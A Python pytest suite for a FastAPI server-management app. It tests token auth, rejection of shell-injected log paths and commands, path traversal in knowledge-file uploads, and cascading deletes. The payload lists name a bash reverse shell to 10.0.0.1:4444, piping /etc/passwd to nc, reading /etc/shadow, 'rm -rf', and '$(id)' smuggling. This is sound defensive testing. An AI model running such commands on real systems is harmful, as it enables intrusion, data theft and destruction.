"""T18 安全回归测试 — T4 注入 / T5 鉴权 / T7 外键级联 / T8 路径穿越 / T9 命令策略。

Mock 一律打在消费方命名空间（`app.routes.servers.*`）：即使校验逻辑回归，
测试也只会命中“被调用即失败”的哨兵，绝不会真的发起 SSH/网络调用。
"""

import asyncio

import pytest
from fastapi import HTTPException

from app import db
from app.routes import knowledge
from app.routes import servers as servers_routes

# T4：`/logs` 的 log_path 注入载荷（含 shell 元字符；校验必须在 SSH 之前拒绝）
LOG_PATH_INJECTION_PAYLOADS = [
    "/tmp/x; touch /tmp/opencode_pwned",
    "/tmp/x && id",
    "/tmp/x | nc 127.0.0.1 4444",
    "/tmp/x `id`",
    "/tmp/$(id)/x",
    "/tmp/x > /tmp/y",
    "/tmp/x\nid",
]

# T9：execute 的元字符载荷
EXECUTE_INJECTION_PAYLOADS = [
    "ls; rm -rf ~",
    "bash -i >& /dev/tcp/10.0.0.1/4444",
    "uptime && cat /etc/shadow",
    "cat /etc/passwd | nc 10.0.0.1 4444",
    "echo `id`",
    "echo $(id)",
    "uptime\nrm -rf /",
]


def _scalar(sql: str, params: tuple = ()):
    """同步测试里执行一次标量查询（独立事件循环，随用随关）。"""

    async def go():
        conn = await db.get_db()
        try:
            cursor = await conn.execute(sql, params)
            row = await cursor.fetchone()
            return row[0]
        finally:
            await conn.close()

    return asyncio.run(go())


def _block_ssh(monkeypatch) -> None:
    """安装“被调用即失败”的哨兵，证明拒绝分支没有触达 SSH 边界。"""

    async def forbidden(*args, **kwargs):
        raise AssertionError("SSH must not be reached for a rejected request")

    monkeypatch.setattr(servers_routes, "tail_log", forbidden)
    monkeypatch.setattr(servers_routes, "fetch_journalctl", forbidden)
    monkeypatch.setattr(servers_routes, "ssh_exec", forbidden)
    monkeypatch.setattr(servers_routes, "check_connectivity", forbidden)


def _mock_exec(monkeypatch, result=("ok", "", 0)) -> list:
    calls: list = []

    async def fake(*args, **kwargs):
        calls.append((args, kwargs))
        return result

    monkeypatch.setattr(servers_routes, "ssh_exec", fake)
    return calls


# ======================== T5 鉴权 ========================


def test_api_rejects_missing_token(client):
    resp = client.get("/api/servers")
    assert resp.status_code == 401
    assert resp.headers.get("WWW-Authenticate") == "Bearer"


def test_api_rejects_wrong_token(client):
    resp = client.get("/api/servers", headers={"Authorization": "Bearer wrong-token"})
    assert resp.status_code == 401


def test_api_accepts_valid_token(client, auth_headers):
    resp = client.get("/api/servers", headers=auth_headers)
    assert resp.status_code == 200
    assert resp.json() == []


def test_health_endpoint_is_exempt(client):
    assert client.get("/api/health").json() == {"status": "ok"}


def test_page_routes_are_exempt(client):
    assert client.get("/").status_code == 200


def test_openapi_docs_are_disabled(client):
    assert client.get("/docs").status_code == 404
    assert client.get("/openapi.json").status_code == 404


# ======================== T4 远程日志命令注入 ========================


@pytest.mark.parametrize("payload", LOG_PATH_INJECTION_PAYLOADS)
def test_logs_rejects_command_injection(client, auth_headers, make_server, monkeypatch, payload):
    server_id = make_server()
    _block_ssh(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_path": payload},
        headers=auth_headers,
    )

    assert resp.status_code == 400


def test_logs_rejects_parent_traversal(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    _block_ssh(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_path": "/var/log/../../etc/passwd"},
        headers=auth_headers,
    )

    assert resp.status_code == 400


def test_logs_rejects_relative_path(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    _block_ssh(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_path": "var/log/nginx/error.log"},
        headers=auth_headers,
    )

    assert resp.status_code == 400


def test_logs_rejects_invalid_unit(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    _block_ssh(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_type": "journalctl", "unit": "nginx; id"},
        headers=auth_headers,
    )

    assert resp.status_code == 400


@pytest.mark.parametrize("lines", [0, 10001, "abc"])
def test_logs_rejects_invalid_lines(client, auth_headers, make_server, monkeypatch, lines):
    server_id = make_server()
    _block_ssh(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_path": "/var/log/nginx/error.log", "lines": lines},
        headers=auth_headers,
    )

    assert resp.status_code == 400


def test_logs_preserves_glob_for_tail(client, auth_headers, make_server, monkeypatch):
    """校验通过后必须原样拼接 glob（不得 shlex.quote，否则多文件轮转日志静默失效）。"""
    server_id = make_server()
    calls: list = []

    async def fake_tail(*args, **kwargs):
        calls.append(kwargs)
        return "MARKER-AAA\nMARKER-BBB"

    monkeypatch.setattr(servers_routes, "tail_log", fake_tail)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_path": "/var/log/nginx/error.log*", "lines": 50},
        headers=auth_headers,
    )

    assert resp.status_code == 200
    content = resp.json()["content"]
    assert "MARKER-AAA" in content
    assert "MARKER-BBB" in content
    assert calls[0]["log_path"] == "/var/log/nginx/error.log*"
    assert calls[0]["lines"] == 50


def test_logs_journalctl_passes_validated_unit(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    calls: list = []

    async def fake_journalctl(*args, **kwargs):
        calls.append(kwargs)
        return "journal line"

    monkeypatch.setattr(servers_routes, "fetch_journalctl", fake_journalctl)

    resp = client.post(
        f"/api/servers/{server_id}/logs",
        json={"log_type": "journalctl", "unit": "nginx.service", "lines": 100},
        headers=auth_headers,
    )

    assert resp.status_code == 200
    assert calls[0]["unit"] == "nginx.service"
    assert calls[0]["lines"] == 100


# ======================== T7 外键级联 ========================


def test_delete_server_cascades_related_rows(client, auth_headers, make_server):
    server_id = make_server()

    async def seed():
        check = await db.save_health_check(
            server_id, {"cpu_percent": 12.5, "mem_percent": 30.0}, "ok", "raw"
        )
        await db.save_alert(server_id, check["id"], "cpu", "warning", "cpu high")
        await db.save_execution(server_id, "uptime", "up", "", 0)

    asyncio.run(seed())
    assert _scalar("SELECT COUNT(*) FROM health_checks WHERE server_id=?", (server_id,)) == 1

    resp = client.delete(f"/api/servers/{server_id}", headers=auth_headers)
    assert resp.status_code == 200

    assert _scalar("SELECT COUNT(*) FROM health_checks WHERE server_id=?", (server_id,)) == 0
    assert _scalar("SELECT COUNT(*) FROM alerts WHERE server_id=?", (server_id,)) == 0
    assert _scalar("SELECT COUNT(*) FROM execution_logs WHERE server_id=?", (server_id,)) == 0


def test_every_connection_enables_foreign_keys(client):
    async def fk_enabled() -> int:
        conn = await db.get_db()
        try:
            cursor = await conn.execute("PRAGMA foreign_keys")
            return (await cursor.fetchone())[0]
        finally:
            await conn.close()

    assert asyncio.run(fk_enabled()) == 1


# ======================== T8 知识库路径穿越 ========================


@pytest.fixture()
def temp_knowledge(tmp_path, monkeypatch):
    kdir = tmp_path / "knowledge"
    monkeypatch.setattr(knowledge, "KNOWLEDGE_DIR", str(kdir))
    return kdir


def test_upload_accepts_plain_markdown(client, auth_headers, temp_knowledge):
    resp = client.post(
        "/api/knowledge",
        files={"file": ("runbook.md", b"# Runbook")},
        headers=auth_headers,
    )

    assert resp.status_code == 200
    assert (temp_knowledge / "runbook.md").read_bytes() == b"# Runbook"


@pytest.mark.parametrize("filename", ["../evil.md", "/abs/evil.md", "evil.txt"])
def test_upload_rejects_traversal_and_bad_suffix(
    client, auth_headers, temp_knowledge, tmp_path, filename
):
    resp = client.post(
        "/api/knowledge",
        files={"file": (filename, b"pwned")},
        headers=auth_headers,
    )

    assert resp.status_code == 400
    assert not (tmp_path / "evil.md").exists()
    assert not (temp_knowledge / "evil.md").exists()


def test_delete_unknown_file_returns_404(client, auth_headers, temp_knowledge):
    resp = client.delete("/api/knowledge/missing.md", headers=auth_headers)
    assert resp.status_code == 404


def test_delete_rejects_encoded_traversal(client, auth_headers, temp_knowledge):
    temp_knowledge.mkdir(parents=True, exist_ok=True)
    target = temp_knowledge / "keep.md"
    target.write_text("keep", encoding="utf-8")

    resp = client.delete("/api/knowledge/..%2Fkeep.md", headers=auth_headers)

    assert resp.status_code == 404
    assert target.exists()


def test_safe_knowledge_path_rejects_traversal(temp_knowledge):
    with pytest.raises(HTTPException) as excinfo:
        knowledge._safe_knowledge_path("../keep.md", 404)

    assert excinfo.value.status_code == 404


# ======================== T9 命令执行策略 ========================


@pytest.mark.parametrize("command", EXECUTE_INJECTION_PAYLOADS)
def test_execute_rejects_shell_metacharacters(client, auth_headers, make_server, monkeypatch, command):
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": command},
        headers=auth_headers,
    )

    assert resp.status_code == 400
    assert calls == []
    # 拦截分支必须留审计：exit_code=-1，stderr 记录 blocked 原因
    assert (
        _scalar(
            "SELECT COUNT(*) FROM execution_logs WHERE server_id=? AND exit_code=-1",
            (server_id,),
        )
        == 1
    )


def test_execute_allows_allowlisted_command_without_confirm(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    calls = _mock_exec(monkeypatch, result=("up 1 day", "", 0))

    resp = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "uptime"},
        headers=auth_headers,
    )

    assert resp.status_code == 200
    assert resp.json() == {"stdout": "up 1 day", "stderr": "", "exit_code": 0}
    assert len(calls) == 1
    assert _scalar("SELECT exit_code FROM execution_logs WHERE server_id=?", (server_id,)) == 0


def test_execute_allows_absolute_allowlisted_path(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "/usr/bin/uptime"},
        headers=auth_headers,
    )

    assert resp.status_code == 200
    assert len(calls) == 1


def test_execute_allows_systemctl_status(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "systemctl status nginx"},
        headers=auth_headers,
    )

    assert resp.status_code == 200
    assert len(calls) == 1


def test_execute_requires_confirm_for_unknown_binary(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    denied = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "curl http://example.invalid"},
        headers=auth_headers,
    )
    assert denied.status_code == 400
    assert calls == []

    confirmed = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "curl http://example.invalid", "confirm": True},
        headers=auth_headers,
    )
    assert confirmed.status_code == 200
    assert len(calls) == 1


def test_execute_non_allowlisted_path_needs_confirm(client, auth_headers, make_server, monkeypatch):
    """任意目录下的同名可执行文件不得进入直接执行档（如 /tmp/ls）。"""
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    denied = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "/tmp/ls"},
        headers=auth_headers,
    )
    assert denied.status_code == 400
    assert calls == []

    confirmed = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": "/tmp/ls", "confirm": True},
        headers=auth_headers,
    )
    assert confirmed.status_code == 200
    assert len(calls) == 1


def test_execute_rejects_argument_token_with_space(client, auth_headers, make_server, monkeypatch):
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": 'ls "a b"'},
        headers=auth_headers,
    )

    assert resp.status_code == 400
    assert calls == []


@pytest.mark.parametrize("command", ["", "   ", 123])
def test_execute_rejects_empty_or_non_string_command(
    client, auth_headers, make_server, monkeypatch, command
):
    server_id = make_server()
    calls = _mock_exec(monkeypatch)

    resp = client.post(
        f"/api/servers/{server_id}/execute",
        json={"command": command},
        headers=auth_headers,
    )

    assert resp.status_code == 400
    assert calls == []
